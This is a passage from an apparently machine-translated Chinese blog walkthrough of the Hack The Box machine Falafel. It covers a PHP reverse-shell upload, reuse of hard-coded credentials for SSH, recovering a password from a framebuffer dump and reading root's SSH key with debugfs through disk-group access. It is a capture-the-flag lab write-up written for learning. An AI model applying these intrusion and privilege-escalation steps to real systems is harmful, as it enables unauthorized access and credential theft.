paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pp"><img src="../Images/1b132903c676acff9a216fb690281533.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ahHMZeDc05U3qbhrmD0DUw.png"/></div></div></figure><h2 id="4a1c" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">PHP反向外壳</h2><p id="bf89" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">我把文件内容从<code class="fe lj lk ll lm b">&lt;?php phpinfo(); ?&gt;</code>交换到PHP反向shell。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pq"><img src="../Images/dc225431f8dbbc094b22c94b9c9d7426.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N1GzGFl6fv712zYdUWXKKw.png"/></div></div></figure><p id="cf3d" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我做了同样的过程来上传一个文件，通过访问上传的URL，我收到了作为<code class="fe lj lk ll lm b">www-data</code>用户的反向shell。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pr"><img src="../Images/66b0cfc56076cdef0bf8ddfa22dbb3df.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MtE-GJzohas77I6l2D74BA.png"/></div></div></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h1 id="1d39" class="lu lv it bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">权限提升</h1><h2 id="304b" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">www-data → moshe(密码重用)</h2><p id="32e1" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">我在<code class="fe lj lk ll lm b">connections.php</code>文件中找到了<code class="fe lj lk ll lm b">moshe</code>用户的以下凭证:<code class="fe lj lk ll lm b">moshe : falafelIsReallyTasty</code></p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi ps"><img src="../Images/eeec613666559b075c0c1625a7129cce.png" data-original-src="https://miro.medium.com/v2/resize:fit:1180/format:webp/1*z2EdCfbnoK-HI_gzhc38dQ.png"/></div></figure><h2 id="aaae" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">user.txt</h2><p id="d508" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">重用该凭证，我能够以<code class="fe lj lk ll lm b">moshe</code>用户的身份SSH登录并读取<code class="fe lj lk ll lm b">user.txt</code>标志。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pt"><img src="../Images/ffe2a40c655ec22385c2e0c1527ec3c6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HcPI0FyZAKobPBSGaYBsaQ.png"/></div></div></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h2 id="1315" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">moshe → yossi(从帧缓冲区检索凭证)</h2><p id="d5a0" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">这种权限提升需要大量的枚举工作。而且和<code class="fe lj lk ll lm b">moshe</code>用户群有关。该用户是许多群组的一部分，尤其是<code class="fe lj lk ll lm b">video</code>很有趣。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pu"><img src="../Images/a1326c79199ac16ab6b8a0b4a08b5e71.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*QJL5enI733__Yu4du3E5wQ.png"/></div></div></figure><p id="1717" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">该<code class="fe lj lk ll lm b">video</code>组中的用户可以访问视频捕获设备，如<a class="ae nr" href="https://en.wikipedia.org/wiki/Linux_framebuffer" rel="noopener ugc nofollow" target="_blank">帧缓冲区</a>。所以我列举了<code class="fe lj lk ll lm b">video</code>的组信息。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="3b60" class="ms lv it lm b gy nm nn l no np"><strong class="lm iu">$ find / -group video 2&gt;/dev/null</strong><br/>/dev/fb0<br/>/dev/dri/card0<br/>/dev/dri/renderD128<br/>/dev/dri/controlD64</span></pre><p id="26e4" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">framebuffer设备很有趣，我把它放到了一个文件中，并转移到了我的Kali中。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="8aff" class="ms lv it lm b gy nm nn l no np"><strong class="lm iu"># Saving it to a file</strong><br/>$ file /dev/fb0<br/>/dev/fb0: character special (29/0)<br/>$ cat /dev/fb0 &gt; fb0.data</span><span id="893e" class="ms lv it lm b gy nq nn l no np"><strong class="lm iu"># Moving it to Kali</strong><br/># scp moshe@10.10.10.73:/home/moshe/fb0.data .<br/>moshe@10.10.10.73's password: <br/>fb0.data                                                                                                                                  100% 4065KB   4.5MB/s   00:00</span></pre><p id="1566" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">下载完成后，我使用Gimp之类的图像浏览器打开<code class="fe lj lk ll lm b">fb0.data</code>文件以获取<code class="fe lj lk ll lm b">yossi : MoshePlzStopHackingMe!</code>的密码。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="b64b" class="ms lv it lm b gy nm nn l no np"><strong class="lm iu"># Installing Gimp to your Kali</strong><br/>apt-get install gimp<br/>apt-get install liblcms2-2 (If you get a LiblCMS mismatch error)</span></pre><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pv"><img src="../Images/5912c7e1f3f54b951d167ccd554e6278.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WxrapoDTsAK7OWLocaYaWA.png"/></div></div></figure><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi pw"><img src="../Images/1195dbadca8e5fcd47a7d7647e78744d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*AkDQP3CiQJuUM1lgX12Ecg.png"/></div></div></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h2 id="6310" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">yossi → root(文件系统调试权限)</h2><p id="0c28" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated"><code class="fe lj lk ll lm b">yossi</code>也是许多组的一部分，但是她是<code class="fe lj lk ll lm b">disk</code>组的一部分，她可以对磁盘进行原始访问。</p><blockquote class="ou ov ow"><p id="c6c3" class="jx jy ox jz b ka kb kc kd ke kf kg kh oy kj kk kl oz kn ko kp pa kr ks kt ku im bi translated"><strong class="jz iu">磁盘</strong>:对磁盘的原始访问。<strong class="jz iu">大多相当于root权限。</strong></p><p id="ddb2" class="jx jy ox jz b ka kb kc kd ke kf kg kh oy kj kk kl oz kn ko kp pa kr ks kt ku im bi translated">组<strong class="jz iu">磁盘</strong>可能非常危险，因为/dev/sd*和/dev/hd*中的硬盘驱动器可以绕过任何文件系统和任何分区进行读写，允许普通用户在没有root权限的情况下公开、更改和销毁分区以及这些驱动器的数据。用户永远不应该属于这个组。</p><p id="6e1e" class="jx jy ox jz b ka kb kc kd ke kf kg kh oy kj kk kl oz kn ko kp pa kr ks kt ku im bi translated"><a class="ae nr" href="https://wiki.debian.org/SystemGroups" rel="noopener ugc nofollow" target="_blank">https://wiki.debian.org/SystemGroups</a></p></blockquote><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi px"><img src="../Images/64fd43f5e73f92db577abfcb49a9d421.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hImqG3IhYHooD2g0XnFwWA.png"/></div></div></figure><p id="1537" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">首先，我检查了沙拉三明治盒子中的主文件系统，它是<code class="fe lj lk ll lm b">/dev/sda1</code>。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi py"><img src="../Images/24be296acb97b8290f60115b53a6fd4c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6Edi0wJpXJm5_AW5VdWTMQ.png"/></div></div></figure><p id="a706" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">我使用了<code class="fe lj lk ll lm b">debugfs</code>命令来启用文件系统调试模式，并在其中看到了<code class="fe lj lk ll lm b">/root</code>目录访问。</p><pre class="ne nf ng nh gt ni lm nj nk aw nl bi"><span id="4b78" class="ms lv it lm b gy nm nn l no np"><strong class="lm iu">yossi@falafel:~$ debugfs /dev/sda1</strong><br/>debugfs 1.42.13 (17-May-2015)<br/>debugfs:  ls /</span></pre><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/bc9750aa90ffbe812d6d843bf36cda4f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1322/format:webp/1*AUXoFM6gO2E3hWxMwUrakQ.png"/></div></figure><p id="56ff" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">这允许我阅读<code class="fe lj lk ll lm b">root.txt</code>国旗。</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/aede066a5f78215bbd0aba13e69435fb.png" data-original-src="https://miro.medium.com/v2/resize:fit:656/format:webp/1*_iwGGtvj4cdK17xRNAgrNA.png"/></div></figure><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi qb"><img src="../Images/a0ad75c6a8871a96aba289c12525b7e2.png" data-original-src="https://miro.medium.com/v2/resize:fit:800/format:webp/0*2S8etwz2YbYHqbH4.jpg"/></div></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h2 id="5668" class="ms lv it bd lw mt mu dn ma mv mw dp me ki mx my mi km mz na mm kq nb nc mq nd bi translated">获取根外壳</h2><p id="fb70" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">我可以读取<code class="fe lj lk ll lm b">root</code>用户的<code class="fe lj lk ll lm b">id_rsa</code> (SSH私有密钥):</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi qc"><img src="../Images/bb55cc7c9aa9b97ba066fc2403850692.png" data-original-src="https://miro.medium.com/v2/resize:fit:1128/format:webp/1*geme4lhzJFYpi4EsbuCZzw.png"/></div></figure><p id="5b77" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">使用它，我获得了机器的完全root访问权限:</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div class="gh gi qd"><img src="../Images/4154ba491c53621b326eb0000785766a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/1*fbnYWKWk0hrvk67CY5H2Ag.png"/></div></figure></div><div class="ab cl ln lo hx lp" role="separator"><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls lt"/><span class="lq bw bk lr ls"/></div><div class="im in io ip iq"><h1 id="b281" class="lu lv it bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">结论</h1><p id="8553" class="pw-post-body-paragraph jx jy it jz b ka nx kc kd ke ny kg kh ki nz kk kl km oa ko kp kq ob ks kt ku im bi translated">老实说，这是迄今为止与OSWE最相关的盒子。关于权限提升的部分就不多说了，但是最初的立足点——SQLi和PHP类型的杂耍——攻击载体非常有趣，对OSWE来说是很好的学习。</p><p id="2415" class="pw-post-body-paragraph jx jy it jz b ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku im bi translated">感谢阅读！</p><figure class="ne nf ng nh gt ju gh gi paragraph-image"><div role="button" tabindex="0" class="nt nu di nv bf nw"><div class="gh gi qe"><img src="../Images/48112ddd239e38aedca8c14ca6168c9c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iwr6SvmQNAUZR0MkGCxFtw.png"/></div></div><figcaption class="oe of gj gh gi og oh bd b be z dk translated"><a class="ae nr" href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#" rel="noopener ugc nofollow" target="_blank">感谢TJ_NULL提供OSWE类虚拟机列表</a></figcaption></figure></div></div>    
</body>
</html>